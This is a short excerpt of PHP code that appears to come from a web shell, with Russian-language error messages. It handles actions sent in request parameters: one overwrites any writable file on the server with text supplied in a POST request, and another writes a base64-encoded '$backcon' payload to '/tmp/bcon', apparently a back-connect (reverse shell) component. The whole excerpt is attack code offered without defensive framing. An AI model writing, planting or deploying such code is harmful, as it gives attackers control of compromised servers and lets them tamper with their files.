...
if ('mass' == $act) {
    ...
    exit;
} elseif ('updatefile' == $act) {
    $filename = @$_POST['file'];
    $text = @$_POST['text'];
    if (is_writable($filename)) {
        $handle = fopen($filename, 'w+');
        if (false === fwrite($handle, stripslashes($text))) {
    ...
    $file = '/tmp/bcon';
    $handle = fopen($file, 'w+');
    if (false === fputs($handle, base64_decode($backcon))) {
        die('<font color=#DF0000>Ошибка создания файла  ' . $file . "</font>\n");
    } else {
        fclose($handle);
